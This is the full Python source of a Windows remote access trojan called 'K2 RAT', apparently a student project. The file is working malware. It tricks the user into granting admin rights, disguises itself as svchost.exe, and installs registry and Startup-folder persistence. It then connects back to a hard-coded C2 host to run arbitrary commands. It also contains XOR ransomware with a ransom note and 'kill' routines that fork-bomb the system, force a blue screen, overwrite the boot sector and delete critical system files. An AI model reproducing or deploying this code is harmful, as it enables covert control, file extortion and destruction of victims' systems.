#!/usr/bin/env python3
"""
K2 RAT - Windows Client
NED University Project
FIXED: Ransomware working properly + KILL feature
"""

import socket
import subprocess
import os
import time
import sys
import shutil
import getpass
import ctypes
import threading
from datetime import datetime

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Re-run the script with admin privileges - ONLY ON FIRST RUN"""
    if not is_admin():
        # Show message to user
        ctypes.windll.user32.MessageBoxW(0, 
            "This application requires administrator privileges.\nClick OK to continue.",
            "K2 RAT", 0x40)
        
        # Get the path of the current executable
        if getattr(sys, 'frozen', False):
            script = sys.executable
        else:
            script = os.path.abspath(sys.argv[0])
        
        # Request elevation
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", script, "", None, 1
        )
        sys.exit(0)

# CONFIG - CHANGE KALI IP
C2_IP = "192.168.56.102"
C2_PORT = 5555

# Installation paths for Windows - Using TEMP for better permissions
TEMP_DIR = os.environ.get('TEMP', os.path.expanduser("~\\AppData\\Local\\Temp"))
INSTALL_DIR = os.path.join(TEMP_DIR, "K2RAT")
INSTALL_PATH = os.path.join(INSTALL_DIR, "svchost.exe")
RANSOM_NOTE = "README_IMPORTANT.txt"
LOG_FILE = os.path.join(INSTALL_DIR, "debug.log")
FLAG_FILE = os.path.join(INSTALL_DIR, "installed.flag")

class K2Client:
    def __init__(self):
        self.current_dir = os.getcwd()
        self.running = True
        self.victim_id = f"{os.environ['COMPUTERNAME']}_{os.environ['USERNAME']}"
        self.install_path = INSTALL_PATH
        self.encrypted_folders = []
        
    def hide_console(self):
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    def log(self, message):
        try:
            with open(LOG_FILE, "a") as f:
                f.write(f"[{datetime.now()}] {message}\n")
        except:
            pass

    def is_installed(self):
        """Check if already installed"""
        return os.path.exists(INSTALL_PATH) and os.path.exists(FLAG_FILE)

    # ==================== KILL FEATURE ====================
    def kill_target(self, method="forkbomb"):
        """Kill the target system using various methods - REAL CRASH"""
        try:
            if method == "forkbomb":
                # Windows fork bomb - creates infinite processes
                import subprocess
                for i in range(10):  # Start multiple cmd processes
                    subprocess.Popen(["cmd", "/c", "start", "cmd"], 
                                   shell=True, 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                # Then infinite loop to keep creating
                while True:
                    subprocess.Popen(["cmd", "/c", "start", "cmd"], 
                                   shell=True, 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
            
            elif method == "memory":
                # Memory exhaustion - allocate until crash
                memory_hog = []
                while True:
                    memory_hog.append(bytearray(100*1024*1024))  # 100 MB at a time
                    time.sleep(0.1)
            
            elif method == "disk":
                # Fill disk with junk until crash
                junk_file = os.path.join(TEMP_DIR, "system.junk")
                with open(junk_file, 'wb') as f:
                    while True:
                        f.write(os.urandom(10*1024*1024))  # 10 MB at a time
                        f.flush()
                        time.sleep(0.1)
            
            elif method == "bsod":
                # Windows BSOD methods
                try:
                    # Method 1: Critical process termination
                    import ctypes
                    ntdll = ctypes.windll.ntdll
                    
                    # Try to crash the system
                    buf = ctypes.c_uint()
                    ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(buf))
                    ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
                except:
                    try:
                        # Method 2: Kill critical process
                        os.system("taskkill /f /im csrss.exe >nul 2>&1")
                    except:
                        try:
                            # Method 3: Use raw disk write
                            with open(r"\\.\PhysicalDrive0", "wb") as f:
                                f.write(b"A" * 512)  # Write to boot sector
                        except:
                            pass
            
            elif method == "delete":
                # Delete critical system files
                critical_paths = [
                    "C:\\Windows\\System32\\config\\SAM",
                    "C:\\Windows\\System32\\config\\SYSTEM",
                    "C:\\Windows\\System32\\config\\SECURITY",
                    "C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "C:\\Windows\\System32\\ntoskrnl.exe"
                ]
                for path in critical_paths:
                    try:
                        if os.path.exists(path):
                            os.remove(path)
                    except:
                        pass
            
            return f"[💀] Kill method '{method}' executed - System will crash!"
        except Exception as e:
            return f"[💀] Kill error: {e}"

    # ==================== WINDOWS PERSISTENCE ====================
    def install_persistence(self):
        """Install Windows persistence - FIXED with better error handling"""
        try:
            # Create directory if it doesn't exist
            if not os.path.exists(INSTALL_DIR):
                os.makedirs(INSTALL_DIR, exist_ok=True)
            
            # Get current executable path
            if getattr(sys, 'frozen', False):
                current_exe = sys.executable
            else:
                current_exe = os.path.abspath(sys.argv[0])
            
            # Copy to install location
            try:
                if current_exe.lower() != self.install_path.lower():
                    shutil.copy2(current_exe, self.install_path)
                    # Hide the file
                    ctypes.windll.kernel32.SetFileAttributesW(self.install_path, 2)
            except Exception as e:
                self.log(f"Copy failed: {e}")
                # Try alternate location if admin fails
                alt_path = os.path.join(os.environ['TEMP'], "svchost.exe")
                shutil.copy2(current_exe, alt_path)
                self.install_path = alt_path
            
            # Registry persistence (requires admin)
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "WindowsCache", 0, winreg.REG_SZ, self.install_path)
                winreg.CloseKey(key)
                self.log("Registry persistence added")
            except Exception as e:
                self.log(f"Registry failed (may not be admin): {e}")
            
            # Startup folder (works without admin)
            try:
                startup = os.path.join(os.environ['APPDATA'], 
                    "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                shortcut_path = os.path.join(startup, "WindowsCache.lnk")
                
                # PowerShell to create shortcut
                ps_script = f'''
                $WScriptShell = New-Object -ComObject WScript.Shell
                $Shortcut = $WScriptShell.CreateShortcut("{shortcut_path}")
                $Shortcut.TargetPath = "{self.install_path}"
                $Shortcut.Save()
                '''
                subprocess.run(['powershell', '-Command', ps_script], 
                             capture_output=True, timeout=10)
                self.log("Startup folder persistence added")
            except Exception as e:
                self.log(f"Startup folder failed: {e}")
            
            # Create a batch file in startup as backup
            try:
                startup = os.path.join(os.environ['APPDATA'], 
                    "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                bat_path = os.path.join(startup, "WindowsCache.bat")
                with open(bat_path, 'w') as f:
                    f.write(f'@echo off\nstart "" "{self.install_path}"\n')
                self.log("Batch file backup created")
            except:
                pass
            
            # Create flag file
            try:
                with open(FLAG_FILE, 'w') as f:
                    f.write(f"Installed at {datetime.now()}")
            except:
                pass
            
            self.log("Persistence installation completed")
            return True
        except Exception as e:
            self.log(f"Persistence error: {e}")
            return False

    # ==================== SYSTEM INFO ====================
    def get_system_info(self):
        info = []
        info.append("="*50)
        info.append("SYSTEM INFORMATION")
        info.append("="*50)
        info.append(f"Computer: {os.environ['COMPUTERNAME']}")
        info.append(f"User: {os.environ['USERNAME']}")
        info.append(f"Admin: {is_admin()}")
        info.append(f"Installed: {self.is_installed()}")
        info.append(f"OS: Windows")
        info.append(f"Current Dir: {self.current_dir}")
        info.append(f"Install Path: {self.install_path}")
        info.append(f"Install Dir exists: {os.path.exists(INSTALL_DIR)}")
        info.append("="*50)
        return "\n".join(info)

    # ==================== RANSOMWARE ====================
    def find_secret_folders(self):
        """Find folders with 'secret' in name"""
        targets = []
        search_paths = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads")
        ]
        
        self.log(f"Searching for secret folders in: {search_paths}")
        
        for base_path in search_paths:
            if not os.path.exists(base_path):
                self.log(f"Path does not exist: {base_path}")
                continue
            try:
                self.log(f"Scanning: {base_path}")
                for item in os.listdir(base_path):
                    full_path = os.path.join(base_path, item)
                    if os.path.isdir(full_path):
                        self.log(f"Found folder: {item}")
                        if 'secret' in item.lower():
                            targets.append(full_path)
                            self.log(f"✅ SECRET FOLDER FOUND: {full_path}")
            except Exception as e:
                self.log(f"Error scanning {base_path}: {e}")
        
        self.log(f"Found {len(targets)} secret folders")
        return targets

    def encrypt_files(self, folder):
        """Encrypt files in folder (XOR with key 0x5A)"""
        encrypted = []
        try:
            self.log(f"Starting encryption in: {folder}")
            
            if not os.path.exists(folder):
                self.log(f"Folder does not exist: {folder}")
                return encrypted
            
            # Count files first
            total_files = 0
            for root, dirs, files in os.walk(folder):
                total_files += len([f for f in files if not f.endswith('.locked') and f != RANSOM_NOTE])
            
            self.log(f"Total encryptable files: {total_files}")
            
            for root, dirs, files in os.walk(folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Skip already encrypted files and ransom note
                    if file.endswith('.locked') or file == RANSOM_NOTE:
                        continue
                    
                    try:
                        # Read original file
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        
                        # XOR encryption
                        key = 0x5A
                        encrypted_data = bytes([b ^ key for b in data])
                        
                        # Write encrypted file
                        encrypted_path = file_path + '.locked'
                        with open(encrypted_path, 'wb') as f:
                            f.write(encrypted_data)
                        
                        # Delete original
                        os.remove(file_path)
                        encrypted.append(file_path)
                        self.log(f"✅ Encrypted: {file_path}")
                        
                    except Exception as e:
                        self.log(f"❌ Failed to encrypt {file_path}: {e}")
                        continue
            
            self.log(f"Encryption complete. Encrypted {len(encrypted)} files")
            return encrypted
            
        except Exception as e:
            self.log(f"Encryption error: {e}")
            return encrypted

    def decrypt_files(self, folder):
        """Decrypt files in folder"""
        decrypted = []
        try:
            self.log(f"Starting decryption in: {folder}")
            
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if file.endswith('.locked'):
                        file_path = os.path.join(root, file)
                        try:
                            # Read encrypted file
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            
                            # XOR decrypt (same as encrypt)
                            key = 0x5A
                            decrypted_data = bytes([b ^ key for b in data])
                            
                            # Write decrypted file
                            original_path = file_path[:-7]  # Remove .locked
                            with open(original_path, 'wb') as f:
                                f.write(decrypted_data)
                            
                            # Remove encrypted file
                            os.remove(file_path)
                            decrypted.append(original_path)
                            self.log(f"✅ Decrypted: {original_path}")
                            
                        except Exception as e:
                            self.log(f"❌ Failed to decrypt {file_path}: {e}")
                            continue
            
            self.log(f"Decryption complete. Decrypted {len(decrypted)} files")
            return decrypted
            
        except Exception as e:
            self.log(f"Decryption error: {e}")
            return decrypted

    def ransomware_attack(self, folder=None):
        """Execute ransomware on target folder"""
        try:
            if not folder:
                folders = self.find_secret_folders()
                if not folders:
                    return "❌ No folders with 'secret' in name found"
                folder = folders[0]
            
            self.log(f"Ransomware attack on: {folder}")
            
            if not os.path.exists(folder):
                return f"❌ Folder not found: {folder}"
            
            # Encrypt files
            encrypted = self.encrypt_files(folder)
            
            if encrypted:
                # Create ransom note
                note_path = os.path.join(folder, RANSOM_NOTE)
                try:
                    with open(note_path, 'w') as f:
                        f.write(f"""
========================================
K2 RAT - EDUCATIONAL DEMO
========================================
Victim: {self.victim_id}
Folder: {folder}
Files: {len(encrypted)}
========================================
To decrypt: decrypt {folder}
========================================
""")
                    self.log(f"Ransom note created: {note_path}")
                except Exception as e:
                    self.log(f"Failed to create ransom note: {e}")
                
                # Track for easy decryption
                self.encrypted_folders.append(folder)
                
                return f"✅ Encrypted {len(encrypted)} files in {folder}"
            else:
                return "❌ No files were encrypted"
                
        except Exception as e:
            self.log(f"Ransomware attack error: {e}")
            return f"❌ Ransomware error: {e}"

    def ransomware_decrypt(self, folder=None):
        """Decrypt files in folder"""
        try:
            if not folder and self.encrypted_folders:
                folder = self.encrypted_folders[-1]
            elif not folder:
                folders = self.find_secret_folders()
                if folders:
                    folder = folders[0]
                else:
                    return "❌ No folder specified and no encrypted folders found"
            
            self.log(f"Ransomware decrypt on: {folder}")
            
            if not os.path.exists(folder):
                return f"❌ Folder not found: {folder}"
            
            decrypted = self.decrypt_files(folder)
            
            # Remove ransom note if exists
            note_path = os.path.join(folder, RANSOM_NOTE)
            if os.path.exists(note_path):
                try:
                    os.remove(note_path)
                    self.log("Ransom note removed")
                except:
                    pass
            
            if decrypted:
                return f"✅ Decrypted {len(decrypted)} files in: {folder}"
            else:
                return "❌ No encrypted files found"
                
        except Exception as e:
            self.log(f"Ransomware decrypt error: {e}")
            return f"❌ Decrypt error: {e}"

    # ==================== COMMAND EXECUTION ====================
    def execute_command(self, cmd):
        try:
            low = cmd.lower().strip()
            
            if low == "sysinfo":
                return self.get_system_info() + "\n"
            
            elif low == "install":
                if self.install_persistence():
                    return "[+] Persistence installed\n"
                return "[-] Installation failed\n"
            
            # KILL COMMANDS
            elif low.startswith("kill "):
                method = cmd[5:].strip()
                
                # First send response back
                response = f"[💀] KILL COMMAND '{method}' RECEIVED - System will crash in 2 seconds...\n"
                
                # Execute kill in separate thread
                def do_kill():
                    time.sleep(2)
                    self.kill_target(method)
                
                threading.Thread(target=do_kill, daemon=True).start()
                return response
            
            # RANSOMWARE COMMANDS - IMPROVED
            elif low.startswith("ransomware"):
                parts = cmd.split(' ', 1)
                if len(parts) > 1:
                    result = self.ransomware_attack(parts[1])
                else:
                    result = self.ransomware_attack()
                return result + "\n"
            
            elif low.startswith("decrypt"):
                parts = cmd.split(' ', 1)
                if len(parts) > 1:
                    result = self.ransomware_decrypt(parts[1])
                else:
                    result = self.ransomware_decrypt()
                return result + "\n"
            
            elif low == "whoami":
                return f"{os.environ['COMPUTERNAME']}\\{os.environ['USERNAME']}\n"
            
            elif low.startswith('cd '):
                path = cmd[3:].strip()
                try:
                    os.chdir(path)
                    self.current_dir = os.getcwd()
                    return f"[OK] Now in: {self.current_dir}\n"
                except Exception as e:
                    return f"Error: {e}\n"
            
            elif low == "help":
                return """
╔════════════════════════════════════════════════════╗
║  K2 RAT COMMANDS                                   ║
╠════════════════════════════════════════════════════╣
║  sysinfo           - System info                   ║
║  install           - Install persistence           ║
║  ransomware        - Encrypt secret folders        ║
║  decrypt           - Decrypt files                 ║
║  kill forkbomb     - Crash with process explosion  ║
║  kill memory       - Crash with memory exhaustion  ║
║  kill disk         - Crash by filling disk         ║
║  kill bsod         - Cause Blue Screen of Death    ║
║  kill delete       - Delete critical system files  ║
║  whoami            - Current user                  ║
║  cd <path>         - Change directory              ║
║  any command       - Run any Windows command       ║
╚════════════════════════════════════════════════════╝
"""
            else:
                result = subprocess.run(cmd, shell=True, cwd=self.current_dir,
                                      capture_output=True, text=True, timeout=30)
                output = result.stdout + result.stderr
                return output if output else "[OK]\n"
        except subprocess.TimeoutExpired:
            return "Command timed out\n"
        except Exception as e:
            return f"Error: {e}\n"

    def start(self):
        # Create install directory
        try:
            os.makedirs(INSTALL_DIR, exist_ok=True)
        except:
            pass
        
        # Check if already installed
        installed = self.is_installed()
        
        # Check if running from persistence location
        is_persistence = False
        if getattr(sys, 'frozen', False):
            current_exe = sys.executable.lower()
            if current_exe == self.install_path.lower():
                is_persistence = True
        
        # Log startup
        self.log(f"Starting - PID: {os.getpid()}, Admin: {is_admin()}, Installed: {installed}, Persistence: {is_persistence}")
        
        # ONLY ask for admin if NOT installed
        if not installed and not is_admin() and not is_persistence:
            run_as_admin()
            return
        
        self.hide_console()
        
        # If first run with admin, install persistence
        if not installed and is_admin():
            self.install_persistence()
        
        # Main connection loop
        while self.running:
            try:
                s = socket.socket()
                s.settimeout(30)
                s.connect((C2_IP, C2_PORT))
                s.send(f"Connected from {os.environ['COMPUTERNAME']} as {os.environ['USERNAME']} [ADMIN]".encode())
                
                while self.running:
                    try:
                        data = s.recv(4096).decode().strip()
                        if not data:
                            break
                        
                        if data == "HEARTBEAT":
                            s.send(b"ALIVE")
                        elif data.startswith("EXEC:"):
                            output = self.execute_command(data[5:])
                            s.send(output.encode())
                        else:
                            output = self.execute_command(data)
                            s.send(output.encode())
                    except socket.timeout:
                        continue
                    except:
                        break
            except Exception as e:
                self.log(f"Connection error: {e}")
                time.sleep(10)
            finally:
                try:
                    s.close()
                except:
                    pass

if __name__ == "__main__":
    client = K2Client()
    client.start()